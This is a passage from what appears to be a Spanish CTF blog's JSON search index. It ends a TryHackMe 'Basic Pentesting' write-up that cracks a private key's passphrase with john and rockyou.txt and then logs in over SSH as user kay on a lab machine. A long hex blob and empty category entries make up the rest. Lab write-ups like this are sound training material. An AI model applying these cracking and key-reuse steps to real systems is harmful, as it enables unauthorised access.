21979cdc37b5b983f301af78655f352684c57799037f633a09b755ba0de9c017a73d76e0a8f46c4c33c4207358a8b408f1c52d8b8ca0378ba8ffcd224a125e5a0973c6997a6225e51007e600c22d3e24ebbc1e8bd8ff250eb32d44f4bd298ba27a3522215db0c3b89d49f2277cfedd74c3b59a1497936263826308f2e14cd363025aa7a5c39aa9a77b815dd10ff6ac9a5d8bda4074513f0fad3b6df926da5ca3c51f47479a8c271a60dab493fe78cadce92f3debe1c05ef72f3f194a36d23bfa3b0d4f0b8f04236d485be8d7d97dfb1c5de79613568d58f113308e8a73c7b87ca11b7b53e63d37f055b5bb7e5f39982e7bbedea3aae16daa3b29ccd8f9d98d53e97a1fbc0c1a2e701e5b7d7b224a4371358b02103e25b29c54138b8c4b7c9706967fe384b263c284ceb0336887e7da79e3c10d54d85689c0db4c379388b2138d0c40017fd2256aae3a2d21a93116a134d5f0ce8ce1fbf2c61509868c823fccdff62aca54796ff99aa5b0bc588af10537f26eccfa6962e595fbeac9df244f6cbaf6b77a11cfd8078de615833305fe0ae0d22173e8d744435fe3a69a81313109f9c5cdcb56d67544a36aa27a3b7c0db50b3b829972368ff2ed998c1910b392720c0d4cbaa907a49f2c38f970503971d64b6972f5b7b5c34735a08129c2b7ee82c6ccc49ddc943a5ae2f4467c5d7a07859e39ae00023c771d59caca0817ce412d35849abd9d225ed96e34de5266b31fd4dd82dab9469582b1e41687a39f108da54b6e84771542cb11f5c522e62b79b6867e8a20df2e8c9bf9ff36634c0de536fa3d377fa27543b6c90895f13bdf50f03b2dd97e5d25d452fa6a0d225704eb3c19751864285dfe3031bc2ff5b0c5d19a7feae6ad5625757477aa3c3f0eb635717f1f5b9037b3a76425db2a2151e2810eefbb75853d939360d1240093b2497a8903eff9b98bc705c2afe0e5541af2bb06b0ec50e4caf798a7f59ffc3a3e70565d887b9f694bdfa64d15a70ed55eacccc69af3fe3cf5aa5b6e3a7186eb5036e12efe53fcc509719a6a6f3ec0c008cb6a035229a1597d9be6beb13444d84c93f2164844c8ae69aa13648578087b98e90dd03f9da47d9ce306dddc88dd80998bf6d3910d209bebb1a70f8b73d944d949b1b1b19b13a455776f3c2e6647fa6722fc2bad5b202502684e91514a11e3437a92a09febffcfc3d55095b43e14b0567e8f5cbd91728b693fe82b8f75ccaf27c0651152faaf0610d2edcabc0b9ac51895180fbf60b868771dee58edb97e99d5ca3592cc9733a76ae0b96ca5788be62e8fb006204c574482579701781b46ec979bdbc9d339e57967051ca87fadae7184bd79cac0af834632081c5df6189dcc4cc8a0170cac12c30c1fff21c4c17f20813112bf901df81c5d78ca22024f1cd58cb5b73c1d68c6529ce4b21d7b95941e099f9a6140bdd1f0ead9113b2e5f17c354aacf79a38a104d6f844559417552387182ba20d890203a6a5e9661d23d8b6fae351a208ef5550555592011fec39609858b6b22743b0cca80c97d58076a660be95e460177cab3fd6b690b01a0e4f5d0507157afe9c4dc7f384187256a9a5d56ab00d466d44e4f07e5f348e8f100e5abe1c4d1bbc207fa3617140a604b607c7e3f5020f9aabb0700ad790e7847e085eb2243e503bf7d097ae15a2ee6179262e351773bb880123c0a87a43f62380fbe08fc2c63ac08ffe2ba0c6deeefbdd49eeaa2ffd1053aceec67b25f92dcfd25b58fa4fab2328481af26f5f4b5d21e1312b78f913b7f08254b064336d84c1aa3c82582e1cde55b5a347d264cb9e98df34b5490831e5d212b38b7cd999daf186a97efd6250e1e6820079358542f77ac78ddd9a505919c318000fc47f8b80fc84f12cf58adf1a3ee3fc8190015058c16c414cc0d6017b9a1fb032ee20e842573b30fc3214ac5fb8962437477e81bb6479fa498f148924796d6d616218ec2a5fa0949def8542dc9b75fd95b75c26fbe91ef9b06e61e90e0df20bb973f33471dab5e87f4c1f0a5d8a7f4e653a8edb337116fa6e5ed858 Con el hash en el archivo, lo crackeamos con john y la wordlist **rockyou.txt para conseguir la contraseña: \u0026lsquo;beeswax\u0026rsquo;.\njohn -w /usr/share/wordlists/rockyou.txt hash Ahora podemos iniciar sesión con kay añadiendo el id_rsa con el parámetro -i. Para usar la clave, el archivo debe tener los permisos numéricos 600.\nchmod 600 id_rsa ssh -i id_rsa kay@10.10.176.74 Una vez dentro, la flag está en el directorio home del usuario kay. ","date":"8 June 2024","externalUrl":null,"permalink":"/writeups/tryhackme/easy/basic-pentesting/","section":"Writeups","summary":"Enumeración Lo primero es enumerar los puertos para ver que servicios están activos en la máquina con nmap.","title":"Basic Pentesting","type":"writeups"},{"content":"","date":"1 March 2024","externalUrl":null,"permalink":"/writeups/dockerlabs/dl-easy/","section":"Writeups","summary":"","title":"[DL] Easy","type":"writeups"},{"content":"","date":"1 March 2024","externalUrl":null,"permalink":"/writeups/hackthebox/htb-easy/","section":"Writeups","summary":"","title":"[HTB] Easy","type":"writeups"},{"content":"","date":"1 March 2024","externalUrl":null,"permalink":"/writeups/tryhackme/easy/","section":"Writeups","summary":"","title":"[THM] Easy","type":"writeups"},{"content":"","date":"1 March 2024","externalUrl":null,"permalink":"/writeups/dockerlabs/","section":"Writeups","summary":"","title":"DockerLabs","type":"writeups"},{"content":"","date":"1 March 2024","externalUrl":null,"permalink":"/writeups/hackthebox/","section":"Writeups","summary":"","title":"HackTheBox","type":"writeups"},{"content":"","date":"1 February 2024","externalUrl":null,"permalink":"/writeups/dockerlabs/dl-medium/","section":"Writeups","summary":"","title":"[DL] Medium","type":"writeups"},{"content":"","date":"1 February 2024","externalUrl":null,"permalink":"/writeups/hackthebox/htb-medium/","section":"Writeups","summary":"","title":"[HTB] Medium","type":"writeups"},{"content":"","date":"1 February 2024","externalUrl":null,"permalink":"/writeups/tryhackme/medium/","section":"Writeups","summary":"","title":"[THM] Medium","type":"writeups"},{"content":"","date":"1 January 2024","externalUrl":null,"permalink":"/writeups/dockerlabs/dl-hard/","section":"Writeups","summary":"","title":"[DL] Hard","type":"writeups"},{"content":"","date":"1 January 2024","externalUrl":null,"permalink":"/writeups/hackthebox/htb-hard/","section":"Writeups","summary":"","title":"[HTB] Hard","type":"writeups"},{"content":"","date":"1 January 2024","externalUrl":null,"permalink":"/writeups/tryhackme/hard/","section":"Writeups","summary":"","title":"[THM] Hard","type":"writeups"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/proyectos/","section":"Projects","summary":"","title":"Projects","type":"proyectos"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]